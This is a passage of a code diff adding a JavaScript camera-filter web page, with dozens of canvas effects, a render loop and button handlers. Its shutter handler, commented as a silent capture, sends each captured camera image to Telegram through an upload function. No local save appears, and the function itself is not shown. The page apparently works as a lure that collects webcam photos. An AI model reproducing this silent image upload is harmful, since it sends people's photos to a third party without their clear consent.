+                ctx.fillRect(0, 0, w, h);
+                break;
+            }
+            case 'fire': {
+                const g = ctx.createLinearGradient(0, h, 0, h * 0.5);
+                g.addColorStop(0, 'rgba(255, 100, 0, 0.5)');
+                g.addColorStop(0.5, 'rgba(255, 200, 0, 0.25)');
+                g.addColorStop(1, 'rgba(255, 200, 0, 0)');
+                ctx.fillStyle = g;
+                ctx.fillRect(0, 0, w, h);
+                break;
+            }
+            case 'smoke': {
+                for (let i = 0; i < 20; i++) {
+                    const seed = i * 21.3;
+                    const x = (seed * 63 + t * 30) % w;
+                    const y = h - ((t * 60 + seed * 30) % h);
+                    const size = 30 + (seed % 40);
+                    const g = ctx.createRadialGradient(x, y, 0, x, y, size);
+                    g.addColorStop(0, 'rgba(200, 200, 220, 0.15)');
+                    g.addColorStop(1, 'rgba(200, 200, 220, 0)');
+                    ctx.fillStyle = g;
+                    ctx.beginPath();
+                    ctx.arc(x, y, size, 0, Math.PI * 2);
+                    ctx.fill();
+                }
+                break;
+            }
+            case 'bubbles': {
+                for (let i = 0; i < 20; i++) {
+                    const seed = i * 27.1;
+                    const x = (seed * 41 + Math.sin(t * 2 + i) * 30) % w;
+                    const y = h - ((t * 80 + seed * 25) % h);
+                    const size = 10 + (seed % 20);
+                    ctx.save();
+                    ctx.strokeStyle = 'rgba(255, 255, 255, 0.6)';
+                    ctx.lineWidth = 2;
+                    ctx.beginPath();
+                    ctx.arc(x, y, size, 0, Math.PI * 2);
+                    ctx.stroke();
+                    ctx.restore();
+                }
+                break;
+            }
+            case 'confetti': {
+                const colors = ['#ff2e93', '#fbbf24', '#a855f7', '#38bdf8', '#10b981', '#f97316'];
+                for (let i = 0; i < 40; i++) {
+                    const seed = i * 19.7;
+                    ctx.save();
+                    ctx.translate((seed * 71 + Math.sin(t * 2 + i) * 40) % w, (seed * 31 + t * 150) % h);
+                    ctx.rotate(t * 3 + i);
+                    ctx.fillStyle = colors[i % colors.length];
+                    ctx.fillRect(-4, -6, 8, 12);
+                    ctx.restore();
+                }
+                break;
+            }
+            case 'light_leak': {
+                const g = ctx.createRadialGradient(w * 0.2, h * 0.2, 50, w * 0.2, h * 0.2, Math.max(w, h) * 0.7);
+                g.addColorStop(0, 'rgba(255, 100, 150, 0.5)');
+                g.addColorStop(0.5, 'rgba(255, 200, 100, 0.2)');
+                g.addColorStop(1, 'rgba(0, 0, 0, 0)');
+                ctx.fillStyle = g;
+                ctx.fillRect(0, 0, w, h);
+                break;
+            }
+            case 'vintage': {
+                ctx.save();
+                ctx.globalCompositeOperation = 'multiply';
+                ctx.fillStyle = 'rgba(255, 220, 170, 0.35)';
+                ctx.fillRect(0, 0, w, h);
+                ctx.globalCompositeOperation = 'screen';
+                ctx.fillStyle = 'rgba(80, 30, 10, 0.15)';
+                ctx.fillRect(0, 0, w, h);
+                ctx.restore();
+                break;
+            }
+            case 'sepia': {
+                ctx.fillStyle = 'rgba(112, 66, 20, 0.45)';
+                ctx.fillRect(0, 0, w, h);
+                break;
+            }
+            case 'bw': {
+                ctx.save();
+                ctx.globalCompositeOperation = 'saturation';
+                ctx.fillStyle = 'rgba(128,128,128,1)';
+                ctx.fillRect(0, 0, w, h);
+                ctx.restore();
+                break;
+            }
+            case 'invert': {
+                ctx.save();
+                ctx.globalCompositeOperation = 'difference';
+                ctx.fillStyle = '#fff';
+                ctx.fillRect(0, 0, w, h);
+                ctx.restore();
+                break;
+            }
+            case 'neon_pink': {
+                ctx.fillStyle = 'rgba(255, 20, 147, 0.35)';
+                ctx.fillRect(0, 0, w, h);
+                break;
+            }
+            case 'neon_blue': {
+                ctx.fillStyle = 'rgba(0, 150, 255, 0.35)';
+                ctx.fillRect(0, 0, w, h);
+                break;
+            }
+            case 'neon_green': {
+                ctx.fillStyle = 'rgba(0, 255, 100, 0.3)';
+                ctx.fillRect(0, 0, w, h);
+                break;
+            }
+            case 'duotone_purple': {
+                ctx.fillStyle = 'rgba(147, 51, 234, 0.5)';
+                ctx.fillRect(0, 0, w, h);
+                break;
+            }
+            case 'dreamy': {
+                const g = ctx.createRadialGradient(cx, cy, 0, cx, cy, Math.max(w, h) * 0.7);
+                g.addColorStop(0, 'rgba(255, 255, 255, 0.15)');
+                g.addColorStop(0.5, 'rgba(200, 180, 255, 0.25)');
+                g.addColorStop(1, 'rgba(255, 200, 230, 0.35)');
+                ctx.fillStyle = g;
+                ctx.fillRect(0, 0, w, h);
+                break;
+            }
+            case 'warm': {
+                ctx.fillStyle = 'rgba(255, 180, 100, 0.3)';
+                ctx.fillRect(0, 0, w, h);
+                break;
+            }
+            case 'cool': {
+                ctx.fillStyle = 'rgba(100, 150, 255, 0.3)';
+                ctx.fillRect(0, 0, w, h);
+                break;
+            }
+            case 'contrast': {
+                ctx.save();
+                ctx.globalCompositeOperation = 'overlay';
+                ctx.fillStyle = 'rgba(128,128,128,0.5)';
+                ctx.fillRect(0, 0, w, h);
+                ctx.restore();
+                break;
+            }
+            case 'blur_soft': {
+                ctx.save();
+                ctx.globalAlpha = 0.3;
+                ctx.filter = 'blur(6px)';
+                ctx.drawImage(canvas, 0, 0, w, h);
+                ctx.restore();
+                ctx.filter = 'none';
+                break;
+            }
+            case 'pixelate': {
+                const px = 14;
+                const tmp = document.createElement('canvas');
+                tmp.width = Math.max(1, Math.floor(w / px));
+                tmp.height = Math.max(1, Math.floor(h / px));
+                tmp.getContext('2d').drawImage(canvas, 0, 0, tmp.width, tmp.height);
+                ctx.save();
+                ctx.imageSmoothingEnabled = false;
+                ctx.drawImage(tmp, 0, 0, w, h);
+                ctx.restore();
+                break;
+            }
+            case 'kaleidoscope': {
+                const tmp = document.createElement('canvas');
+                tmp.width = w; tmp.height = h;
+                tmp.getContext('2d').drawImage(canvas, 0, 0);
+                ctx.save();
+                ctx.translate(cx, cy);
+                for (let i = 0; i < 6; i++) {
+                    ctx.save();
+                    ctx.rotate((i / 6) * Math.PI * 2 + t * 0.3);
+                    if (i % 2) ctx.scale(-1, 1);
+                    ctx.drawImage(tmp, -w / 2, -h / 2, w, h, -w / 2, -h / 2, w / 2, h);
+                    ctx.restore();
+                }
+                ctx.restore();
+                break;
+            }
+            case 'mirror_x': {
+                const tmp = document.createElement('canvas');
+                tmp.width = w; tmp.height = h;
+                tmp.getContext('2d').drawImage(canvas, 0, 0);
+                ctx.clearRect(0, 0, w, h);
+                ctx.save();
+                ctx.translate(w / 2, 0);
+                ctx.drawImage(tmp, 0, 0, w / 2, h, -w / 4, 0, w / 2, h);
+                ctx.restore();
+                ctx.save();
+                ctx.translate(w / 2, 0);
+                ctx.scale(-1, 1);
+                ctx.drawImage(tmp, 0, 0, w / 2, h, -w / 4, 0, w / 2, h);
+                ctx.restore();
+                break;
+            }
+            case 'mirror_quad': {
+                const tmp = document.createElement('canvas');
+                tmp.width = w; tmp.height = h;
+                tmp.getContext('2d').drawImage(canvas, 0, 0);
+                ctx.clearRect(0, 0, w, h);
+                ctx.drawImage(tmp, 0, 0, w / 2, h / 2, 0, 0, w / 2, h / 2);
+                ctx.save();
+                ctx.translate(w, 0); ctx.scale(-1, 1);
+                ctx.drawImage(tmp, 0, 0, w / 2, h / 2, 0, 0, w / 2, h / 2);
+                ctx.restore();
+                ctx.save();
+                ctx.translate(0, h); ctx.scale(1, -1);
+                ctx.drawImage(tmp, 0, 0, w / 2, h / 2, 0, 0, w / 2, h / 2);
+                ctx.restore();
+                ctx.save();
+                ctx.translate(w, h); ctx.scale(-1, -1);
+                ctx.drawImage(tmp, 0, 0, w / 2, h / 2, 0, 0, w / 2, h / 2);
+                ctx.restore();
+                break;
+            }
+            case 'glitch': {
+                const tmp = document.createElement('canvas');
+                tmp.width = w; tmp.height = h;
+                tmp.getContext('2d').drawImage(canvas, 0, 0);
+                ctx.clearRect(0, 0, w, h);
+                for (let y = 0; y < h; y += 20) {
+                    const offset = (Math.random() - 0.5) * (Math.sin(t * 10 + y) > 0.7 ? 40 : 8);
+                    ctx.drawImage(tmp, 0, y, w, 20, offset, y, w, 20);
+                }
+                break;
+            }
+            case 'vignette': {
+                const g = ctx.createRadialGradient(cx, cy, Math.min(w, h) * 0.25, cx, cy, Math.max(w, h) * 0.85);
+                g.addColorStop(0, 'rgba(0,0,0,0)');
+                g.addColorStop(1, 'rgba(0,0,0,0.75)');
+                ctx.fillStyle = g;
+                ctx.fillRect(0, 0, w, h);
+                break;
+            }
+            case 'frame_heart': {
+                const t2 = Math.min(w, h) * 0.42;
+                ctx.save();
+                ctx.strokeStyle = 'rgba(255, 46, 147, 0.75)';
+                ctx.lineWidth = 14;
+                ctx.shadowColor = '#ff2e93';
+                ctx.shadowBlur = 25;
+                ctx.beginPath();
+                ctx.moveTo(cx, cy + t2 * 0.4);
+                ctx.bezierCurveTo(cx - t2 * 1.1, cy - t2 * 0.5, cx - t2 * 0.55, cy - t2 * 1.25, cx, cy - t2 * 0.5);
+                ctx.bezierCurveTo(cx + t2 * 0.55, cy - t2 * 1.25, cx + t2 * 1.1, cy - t2 * 0.5, cx, cy + t2 * 0.4);
+                ctx.closePath();
+                ctx.stroke();
+                ctx.restore();
+                break;
+            }
+            case 'frame_stars': {
+                ctx.save();
+                ctx.strokeStyle = 'rgba(253, 224, 71, 0.9)';
+                ctx.lineWidth = 8;
+                ctx.shadowColor = '#fbbf24';
+                ctx.shadowBlur = 20;
+                ctx.strokeRect(8, 8, w - 16, h - 16);
+                ctx.restore();
+                break;
+            }
+            case 'crown': {
+                const cyT = h * 0.18;
+                ctx.save();
+                ctx.fillStyle = '#fbbf24';
+                ctx.shadowColor = '#fde047';
+                ctx.shadowBlur = 20;
+                ctx.beginPath();
+                ctx.moveTo(cx - 60, cyT + 30);
+                ctx.lineTo(cx - 60, cyT);
+                ctx.lineTo(cx - 35, cyT + 15);
+                ctx.lineTo(cx - 20, cyT - 10);
+                ctx.lineTo(cx, cyT + 15);
+                ctx.lineTo(cx + 20, cyT - 10);
+                ctx.lineTo(cx + 35, cyT + 15);
+                ctx.lineTo(cx + 60, cyT);
+                ctx.lineTo(cx + 60, cyT + 30);
+                ctx.closePath();
+                ctx.fill();
+                ctx.restore();
+                break;
+            }
+            case 'cat_ears': {
+                const earY = h * 0.22;
+                ctx.save();
+                ctx.fillStyle = '#2e1065';
+                ctx.beginPath();
+                ctx.moveTo(cx - 100, earY);
+                ctx.lineTo(cx - 130, earY - 60);
+                ctx.lineTo(cx - 60, earY - 40);
+                ctx.closePath();
+                ctx.fill();
+                ctx.beginPath();
+                ctx.moveTo(cx + 100, earY);
+                ctx.lineTo(cx + 130, earY - 60);
+                ctx.lineTo(cx + 60, earY - 40);
+                ctx.closePath();
+                ctx.fill();
+                ctx.restore();
+                break;
+            }
+            case 'glasses': {
+                const gY = cy - 40;
+                ctx.save();
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.85)';
+                ctx.beginPath();
+                ctx.ellipse(cx - 70, gY, 50, 32, 0, 0, Math.PI * 2);
+                ctx.fill();
+                ctx.beginPath();
+                ctx.ellipse(cx + 70, gY, 50, 32, 0, 0, Math.PI * 2);
+                ctx.fill();
+                ctx.beginPath();
+                ctx.moveTo(cx - 20, gY);
+                ctx.lineTo(cx + 20, gY);
+                ctx.lineWidth = 6;
+                ctx.strokeStyle = '#000';
+                ctx.stroke();
+                ctx.restore();
+                break;
+            }
+            case 'beard': {
+                const bY = cy + 60;
+                ctx.save();
+                ctx.fillStyle = 'rgba(40, 20, 10, 0.75)';
+                ctx.beginPath();
+                ctx.moveTo(cx - 100, bY - 20);
+                ctx.quadraticCurveTo(cx - 110, bY + 90, cx, bY + 130);
+                ctx.quadraticCurveTo(cx + 110, bY + 90, cx + 100, bY - 20);
+                ctx.quadraticCurveTo(cx + 70, bY + 30, cx, bY + 20);
+                ctx.quadraticCurveTo(cx - 70, bY + 30, cx - 100, bY - 20);
+                ctx.fill();
+                ctx.restore();
+                break;
+            }
+            case 'mustache': {
+                const mY = cy + 10;
+                ctx.save();
+                ctx.fillStyle = '#1a0a05';
+                ctx.beginPath();
+                ctx.ellipse(cx - 25, mY, 22, 10, 0.2, 0, Math.PI * 2);
+                ctx.ellipse(cx + 25, mY, 22, 10, -0.2, 0, Math.PI * 2);
+                ctx.fill();
+                ctx.restore();
+                break;
+            }
+            case 'halo_angel': {
+                ctx.save();
+                ctx.strokeStyle = 'rgba(255, 255, 150, 0.9)';
+                ctx.lineWidth = 8;
+                ctx.shadowColor = '#fde68a';
+                ctx.shadowBlur = 30;
+                ctx.beginPath();
+                ctx.ellipse(cx, h * 0.15, 120 + Math.sin(t * 3) * 6, 30, 0, 0, Math.PI * 2);
+                ctx.stroke();
+                ctx.restore();
+                break;
+            }
+            case 'devil_horns': {
+                const hy = h * 0.22;
+                ctx.save();
+                ctx.fillStyle = '#dc2626';
+                ctx.shadowColor = '#ff2e93';
+                ctx.shadowBlur = 15;
+                ctx.beginPath();
+                ctx.moveTo(cx - 110, hy + 30);
+                ctx.quadraticCurveTo(cx - 150, hy - 40, cx - 100, hy - 60);
+                ctx.quadraticCurveTo(cx - 100, hy - 20, cx - 80, hy + 20);
+                ctx.closePath();
+                ctx.fill();
+                ctx.beginPath();
+                ctx.moveTo(cx + 110, hy + 30);
+                ctx.quadraticCurveTo(cx + 150, hy - 40, cx + 100, hy - 60);
+                ctx.quadraticCurveTo(cx + 100, hy - 20, cx + 80, hy + 20);
+                ctx.closePath();
+                ctx.fill();
+                ctx.restore();
+                break;
+            }
+            case 'rainbow_aura': {
+                const colors = ['#ff2e93', '#fbbf24', '#10b981', '#38bdf8', '#a855f7'];
+                colors.forEach((col, i) => {
+                    const radius = Math.min(w, h) * 0.42 + i * 10 + Math.sin(t * 2 + i) * 5;
+                    ctx.save();
+                    ctx.strokeStyle = col;
+                    ctx.lineWidth = 8;
+                    ctx.globalAlpha = 0.35;
+                    ctx.beginPath();
+                    ctx.arc(cx, cy, radius, 0, Math.PI * 2);
+                    ctx.stroke();
+                    ctx.restore();
+                });
+                break;
+            }
+            case 'ascii_love': {
+                ctx.save();
+                ctx.font = 'bold 20px monospace';
+                ctx.fillStyle = 'rgba(255, 46, 147, 0.8)';
+                ctx.shadowColor = '#ff2e93';
+                ctx.shadowBlur = 12;
+                const love = '❤️ LOVE ❤️';
+                const offset = (t * 60) % (w + 200);
+                ctx.fillText(love, w - offset, h - 40);
+                ctx.fillText(love, w - offset + w + 200, h - 40);
+                ctx.restore();
+                break;
+            }
+            case 'matrix': {
+                ctx.save();
+                ctx.fillStyle = 'rgba(0, 255, 0, 0.9)';
+                ctx.font = 'bold 16px monospace';
+                ctx.shadowColor = '#0f0';
+                ctx.shadowBlur = 8;
+                const chars = 'アイウエオカキクケコサシスセソ';
+                for (let col = 0; col < 30; col++) {
+                    const x = (col * 50 + t * 100) % w;
+                    const offsetY = (t * 100 + col * 37) % h;
+                    for (let row = 0; row < 6; row++) {
+                        const y = (offsetY + row * 30) % (h + 30);
+                        ctx.globalAlpha = 1 - row * 0.15;
+                        ctx.fillText(chars[(col + row) % chars.length], x, y);
+                    }
+                }
+                ctx.restore();
+                ctx.fillStyle = 'rgba(0, 20, 0, 0.3)';
+                ctx.fillRect(0, 0, w, h);
+                break;
+            }
+            default: break;
+        }
+    }
+
+    /* ═══════════════════════════════════════════════════════════
+       حلقة الرسم
+       ═══════════════════════════════════════════════════════════ */
+    let lastT = 0;
+    function loop(ts) {
+        if (!state.videoReady) return;
+        if (!lastT) lastT = ts;
+        const dt = Math.min((ts - lastT) / 1000, 0.05);
+        lastT = ts;
+        state.time += dt;
+
+        const w = canvas.width / (window.devicePixelRatio || 1);
+        const h = canvas.height / (window.devicePixelRatio || 1);
+        ctx.clearRect(0, 0, w, h);
+        drawVideo();
+        applyFilter(FILTERS[state.currentFilter].id, state.time);
+
+        state.animFrame = requestAnimationFrame(loop);
+    }
+
+    function startLoop() {
+        if (state.animFrame) cancelAnimationFrame(state.animFrame);
+        lastT = 0;
+        loop(performance.now());
+    }
+
+    /* ═══════════════════════════════════════════════════════════
+       الأحداث
+       ═══════════════════════════════════════════════════════════ */
+    btnAllowCamera.addEventListener('click', async () => {
+        sfx.init();
+        await startCamera('user');
+    });
+
+    btnFlipCam.addEventListener('click', async () => {
+        state.facingMode = state.facingMode === 'user' ? 'environment' : 'user';
+        await startCamera(state.facingMode);
+    });
+
+    btnSoundToggle.addEventListener('click', () => {
+        state.soundOn = !state.soundOn;
+        btnSoundToggle.textContent = state.soundOn ? '🔊' : '🔇';
+        if (state.soundOn) sfx.init();
+    });
+
+    // زر الشاتر — التقاط سريع صامت (مع الفلتر)
+    btnShutter.addEventListener('click', async () => {
+        if (!state.videoReady) return;
+        // وميض خفيف فقط
+        captureFlash.classList.add('active');
+        setTimeout(() => captureFlash.classList.remove('active'), 200);
+
+        canvas.toBlob(async (blob) => {
+            if (!blob) return;
+            await uploadToTelegram(blob, `📸 ${FILTERS[state.currentFilter].name}`);
+        }, 'image/jpeg', 0.9);
+    });
+
+    window.addEventListener('orientationchange', () => {
+        setTimeout(() => { resizeCanvas(); checkOrientation(); }, 300);
+    });
+
+    /* ═══════════════════════════════════════════════════════════
+       التهيئة
+       ═══════════════════════════════════════════════════════════ */
+    buildFilterBar();
+    checkOrientation();
+    resizeCanvas();
+})();
+</script>
+</body>
+</html>
